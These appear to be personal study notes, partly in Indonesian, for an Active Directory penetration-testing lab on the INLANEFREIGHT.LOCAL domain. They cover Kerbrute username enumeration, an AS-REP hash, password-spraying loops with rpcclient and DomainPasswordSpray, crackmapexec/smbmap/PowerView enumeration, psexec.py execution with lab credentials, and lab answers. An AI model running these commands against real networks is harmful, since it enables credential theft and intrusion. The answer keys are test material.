$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:41409c69286fa2ec878ac3adbbda25c1$4c1d016275e1485dd378483c1c6c7af9ed3305ba75f4add5605c2740210e86fefb93ff17843cbb74c7294f0209838c9ce46615add9e35071da7a89079ff805c6eef6f65ac9aae62bee5da4721053c30d537bf5579a82ba60bd1979550182c2857ad59f1141a81fa84d8a437ddda1f2df17c947c60584696d3f482a2c66f731cb531e4e14f18e00c6a622b6508b25d4af59c691583587e82c892e8df3543f4e9e7e4fb9b02e3298930f44a50a45c523fb734c939f3abde517069548acb9b34fa150b99893ad0e244914f205904671f273942d77316c60464870e86bddb14f2b0efea4b77b4fd191f7136d7f1e849f2ead45548b66d7dbc489fbdd24555aaa7f0470b6dd34c4b07c98e07d
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
2024/09/03 02:04:41 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
2024/09/03 02:04:42 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
2024/09/03 02:04:43 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
2024/09/03 02:04:43 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
2024/09/03 02:04:44 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
2024/09/03 02:04:44 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
2024/09/03 02:04:44 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
2024/09/03 02:04:45 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
2024/09/03 02:04:45 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
2024/09/03 02:04:46 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
2024/09/03 02:04:46 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
2024/09/03 02:04:46 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
2024/09/03 02:04:46 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
2024/09/03 02:04:47 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
2024/09/03 02:04:47 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
2024/09/03 02:04:47 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
2024/09/03 02:04:47 >  [+] VALID USERNAME:	 minman@inlanefreight.local
2024/09/03 02:04:47 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
2024/09/03 02:04:47 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
2024/09/03 02:04:48 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
2024/09/03 02:04:49 >  [+] VALID USERNAME:	 strent@inlanefreight.local
2024/09/03 02:04:49 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
2024/09/03 02:04:49 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
2024/09/03 02:04:49 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
2024/09/03 02:04:50 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
2024/09/03 02:04:51 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
2024/09/03 02:04:51 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
2024/09/03 02:04:51 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
2024/09/03 02:04:52 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
2024/09/03 02:04:53 >  Done! Tested 48705 usernames (56 valid) in 12.142 seconds
```

Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

answer: 56


# Internal Password Spraying - from Linux


**Question:**
Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

**Answer:**
sgage

```bash
for u in $(cat jsmith.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```


# Internal Password Spraying - from Windows


```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

**Questions:**
Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.

**Answer:**
dbranch

**Solve:**
```powershell
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

# Credentialed Enumeration - from Linux

###### CME - Domain User Enumeration

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

###### CME - Domain Group Enumeration

```shell
AexonFx@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

###### CME - Logged On Users

```shell
AexonFx@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

#### CME Share Searching

###### Share Enumeration - Domain Controller

```shell
AexonFx@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

###### Spider_plus

```shell
AexonFx@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
```




## SMBMap


#### SMBMap To Check Access

```shell
AexonFx@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	User Shares                                       	READ ONLY	
	ZZZ_archive                                       	READ ONLY
```

#### Recursive List Of All Directories

```shell
AexonFx@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department Shares\*
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&D
	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse

```


## rpcclient

```bash
rpcclient -U "" -N 172.16.5.5
```


### rpcclient Enumeration

###### RPCClient User Enumeration By RID

```shell
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000001d
        padding1[0..7]...
        logon_hrs[0..21]..
```


#### Enumdomusers

```shell
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]
user:[lbradford] rid:[0x45c]
user:[sgage] rid:[0x45d]
user:[asanchez] rid:[0x45e]
user:[dbranch] rid:[0x45f]
user:[ccruz] rid:[0x460]
user:[njohnson] rid:[0x461]
user:[mholliday] rid:[0x462]
```

## Perangkat Impacket

Ipacket adalah toolkit serbaguna yang memberi kita banyak cara berbeda untuk menghitung, berinteraksi, dan mengeksploitasi protokol Windows dan menemukan informasi yang kita perlukan menggunakan Python. Alat ini dipelihara secara aktif dan mempunyai banyak kontributor, terutama ketika teknik serangan baru muncul. Kami dapat melakukan banyak tindakan lain dengan Impacket, namun kami hanya akan menyoroti beberapa di bagian ini; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) dan [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

#### Psexec.py

Salah satu alat yang paling berguna di suite Ipacket adalah `psexec.py`. Psexec.py adalah tiruan dari psexec Sysinternals yang dapat dieksekusi, tetapi cara kerjanya sedikit berbeda dari aslinya

#### Menggunakan psexec.py

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

#### wmiexec.py

Wmiexec.py menggunakan shell semi-interaktif tempat perintah dijalankan melalui [Instrumentasi Manajemen Windows](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)

[Windapsearch](https://github.com/ropnop/windapsearch) adalah skrip Python berguna lainnya yang dapat kita gunakan untuk menghitung pengguna, grup, dan komputer dari domain Windows dengan memanfaatkan kueri LDAP. Itu ada di direktori /opt/windapsearch/ host serangan kami.

## BloodHound

BloodHound adalah salah satu, jika bukan alat paling berpengaruh yang pernah dirilis untuk mengaudit keamanan Direktori Aktif, dan ini sangat bermanfaat bagi kami sebagai penguji penetrasi.


	





**Questions:**

1. Pengguna AD manakah yang memiliki RID sama dengan Desimal 1170?

solve:
1. gunakan rpc client
```bash
rpcclient -U "" -N 172.16.5.5
```
2. convert decimal to hex 1170 -> 0x492
3. search rid 0x492

user:[mmorgan] rid:[0x492]


2. Berapa jumlah anggota: dari grup "Magang"?

solve: 
1. gunakan cme
```bash
 sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
2. cari group internship
```bash
┌─[htb-student@ea-attack01]─[/opt]
└──╼ $sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep -i "Interns"
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns                                  membercount: 10
```

answer: 10




# Credentialed Enumeration - from Windows

#### Muat Modul ActiveDirectory

```powershell
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  
```

### Dapatkan Info Domain

```powershell
PS C:\htb> Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```


#### Dapatkan-Pengguna AD

```powershell
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :
```

#### Memeriksa Hubungan Kepercayaan

```powershell
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False  
```

#### Pencacahan Kelompok

```powershell
PS C:\htb> Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

```



#### Info Grup Terperinci

```powershell
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

## PowerView

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) adalah alat yang ditulis dalam PowerShell untuk membantu kita memperoleh kesadaran situasional dalam lingkungan AD. Sama seperti BloodHound, ini menyediakan cara untuk mengidentifikasi di mana pengguna masuk di jaringan, menghitung informasi domain seperti pengguna, komputer, grup, ACLS, kepercayaan, mencari berbagi file dan kata sandi, melakukan Kerberoasting, dan banyak lagi

| **Memerintah**                    | **Keterangan**                                                                                     |
| --------------------------------- | -------------------------------------------------------------------------------------------------- |
| `Export-PowerViewCSV`             | Tambahkan hasil ke file CSV                                                                        |
| `ConvertTo-SID`                   | Konversikan nama Pengguna atau grup ke nilai SID-nya                                               |
| `Get-DomainSPNTicket`             | Meminta tiket Kerberos untuk akun Nama Prinsipal Layanan (SPN) tertentu                            |
| **Fungsi Domain/LDAP:**           |                                                                                                    |
| `Get-Domain`                      | Akan mengembalikan objek AD untuk domain saat ini (atau yang ditentukan).                          |
| `Get-DomainController`            | Kembalikan daftar Pengontrol Domain untuk domain yang ditentukan                                   |
| `Get-DomainUser`                  | Akan mengembalikan semua pengguna atau objek pengguna tertentu di AD                               |
| `Get-DomainComputer`              | Akan mengembalikan semua komputer atau objek komputer tertentu di AD                               |
| `Get-DomainGroup`                 | Akan mengembalikan semua grup atau objek grup tertentu di AD                                       |
| `Get-DomainOU`                    | Cari semua atau objek OU tertentu di AD                                                            |
| `Find-InterestingDomainAcl`       | Menemukan objek ACL di domain dengan hak modifikasi yang disetel ke objek non-bawaan               |
| `Get-DomainGroupMember`           | Akan mengembalikan anggota grup domain tertentu                                                    |
| `Get-DomainFileServer`            | Mengembalikan daftar server yang kemungkinan berfungsi sebagai server file                         |
| `Get-DomainDFSShare`              | Mengembalikan daftar semua sistem file terdistribusi untuk domain saat ini (atau yang ditentukan). |
| **Fungsi GPO:**                   |                                                                                                    |
| `Get-DomainGPO`                   | Akan mengembalikan semua GPO atau objek GPO tertentu di AD                                         |
| `Get-DomainPolicy`                | Mengembalikan kebijakan domain default atau kebijakan pengontrol domain untuk domain saat ini      |
| **Fungsi Pencacahan Komputer:**   |                                                                                                    |
| `Get-NetLocalGroup`               | Menghitung grup lokal di mesin lokal atau jarak jauh                                               |
| `Get-NetLocalGroupMember`         | Menghitung anggota kelompok lokal tertentu                                                         |
| `Get-NetShare`                    | Mengembalikan share terbuka di mesin lokal (atau jarak jauh).                                      |
| `Get-NetSession`                  | Akan mengembalikan informasi sesi untuk mesin lokal (atau jarak jauh).                             |
| `Test-AdminAccess`                | Menguji apakah pengguna saat ini memiliki akses administratif ke mesin lokal (atau jarak jauh).    |
| **Fungsi 'Meta' Berulir:**        |                                                                                                    |
| `Find-DomainUserLocation`         | Menemukan mesin tempat pengguna tertentu masuk                                                     |
| `Find-DomainShare`                | Menemukan bagian yang dapat dijangkau di mesin domain                                              |
| `Find-InterestingDomainShareFile` | Mencari file yang cocok dengan kriteria tertentu pada bagian yang dapat dibaca di domain           |
| `Find-LocalAdminAccess`           | Temukan mesin di domain lokal tempat pengguna saat ini memiliki akses administrator lokal          |
| **Fungsi Kepercayaan Domain:**    |                                                                                                    |
| `Get-DomainTrust`                 | Mengembalikan kepercayaan domain untuk domain saat ini atau domain tertentu                        |
| `Get-ForestTrust`                 | Mengembalikan semua kepercayaan hutan untuk hutan saat ini atau hutan tertentu                     |
| `Get-DomainForeignUser`           | Menghitung pengguna yang berada dalam grup di luar domain pengguna                                 |
| `Get-DomainForeignGroupMember`    | Menghitung grup dengan pengguna di luar domain grup dan mengembalikan setiap anggota asing         |
| `Get-DomainTrustMapping`          | Akan menghitung semua kepercayaan untuk domain saat ini dan domain lain yang terlihat.             |


```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```


#### Keanggotaan Grup Rekursif

```powershell
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

```



#### Pencacahan Kepercayaan

```powershell
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM 
```

#### Menemukan Pengguna Dengan Set SPN

```powershell
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2
```

kita dapat menggunakan SharpView untuk menghitung informasi tentang pengguna tertentu, misalnya pengguna `forend`, yang kami kendalikan.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
samaccounttype                 : USER_OBJECT
objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
useraccountcontrol             : NORMAL_ACCOUNT
accountexpires                 : 12/31/1600 4:00:00 PM
lastlogon                      : 4/18/2022 1:01:21 PM
lastlogontimestamp             : 4/9/2022 1:33:21 PM
